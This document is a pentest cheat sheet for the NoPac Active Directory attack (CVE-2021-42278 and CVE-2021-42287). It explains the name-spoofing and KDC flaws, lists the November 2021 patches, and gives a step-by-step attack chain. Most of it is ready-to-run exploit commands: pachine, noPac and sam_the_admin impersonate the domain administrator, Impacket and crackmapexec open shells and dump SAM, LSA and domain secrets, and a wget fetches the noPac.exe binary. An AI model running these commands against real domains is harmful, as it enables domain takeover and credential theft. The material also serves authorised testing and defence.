# NoPac - CVE-2021-42287 and CVE-2021-42278

## Vulnerability

### CVE-2021-42278 - Name impersonation

Computer accounts should have a trailing `$` in their name (i.e. `sAMAccountName` attribute) but no validation process existed to make sure of it. Abused in combination with CVE-2021-42287, it allowed attackers to impersonate domain controller accounts.

### CVE-2021-42287 - KDC bamboozling

```text
When requesting a Service Ticket, presenting a TGT is required first. When the service ticket is asked for is not found by the KDC, the KDC automatically searches again with a trailing $. What happens is that if a TGT is obtained for bob, and the bob user gets removed, using that TGT to request a service ticket for another user to himself (S4U2self) will result in the KDC looking for bob$ in AD. If the domain controller account bob$ exists, then bob (the user) just obtained a service ticket for bob$ (the domain controller account) as any other user
```

## Patch

November 2021 Patch Tuesday:

```raw
KB5008102
KB5008380
KB5008602
```

## Exploit information

The ability to edit a machine account's sAMAccountName and servicePrincipalName attributes is a requirement to the attack chain !

The attack can then be conducted as follows:

1. Clear the controlled machine account servicePrincipalName attribute of any value that points to its name
2. Change the controlled machine account sAMAccountName to a Domain Controller's name without the trailing `$` (CVE-2021-42278)
3. Request a TGT for the controlled machine account
4. Reset the controlled machine account sAMAccountName to its old value
5. Request a service ticket with S4U2self by presenting the TGT obtained before (CVE-2021-42287)
6. Get access to the domain controller

### Linux

### pachine

Check if target is vulnerable:

```bash
python pachine.py -dc-host DC_NAME.DOMAIN_NAME -scan 'DOMAIN_NAME/USERNAME:PASSWORD'
```

Exploit:

```bash
python pachine.py -dc-host DC_NAME.DOMAIN_NAME -spn cifs/DC_NAME.DOMAIN_NAME -impersonate administrator 'DOMAIN_NAME/USERNAME:PASSWORD'
```

Import ticket

```bash
export KRB5CCNAME=$PWD/administrator@DOMAIN_NAME.ccache
```

Check import

```bash
klist
```

Use ticket:

> Impacket

```bash
psexec.py -k -no-pass 'DOMAIN_NAME/administrator@DC_NAME.DOMAIN_NAME'
smbexec.py -k -no-pass 'DOMAIN_NAME/administrator@DC_NAME.DOMAIN_NAME'
secretsdump.py -k DC_NAME.DOMAIN_NAME
```

> Crackmapexec

```bash
cme smb DC_NAME.DOMAIN_NAME -u administrator -k
cme smb DC_NAME.DOMAIN_NAME -u administrator -k --sam
cme smb DC_NAME.DOMAIN_NAME -u administrator -k --lsa
```

### noPac

```bash
python scanner.py DOMAIN_NAME/USER:PASSWORD -dc-ip DC_IP_ADDRESS -use-ldap
python noPac.py DOMAIN_NAME/USER:PASSWORD -dc-ip DC_IP_ADDRESS -use-ldap --impersonate administrator -create-child
```

### sam_the_admin

```bash
python sam_the_admin.py DOMAIN_NAME/USER:PASSWORD -dc-ip DC_IP_ADDRESS -shell
```

### Windows

Command:

```batch
noPac.exe -domain DOMAIN_NAME -user USER -pass PASSWORD /enctype aes128
```

Source:

```bash
wget https://github.com/ricardojba/noPac/releases/download/1.0/noPac.exe
```

### Source

- <https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing>
- <https://github.com/ricardojba/noPac>
- <https://github.com/Ridter/noPac>
- <https://github.com/WazeHell/sam-the-admin>
- <https://github.com/ly4k/Pachine>
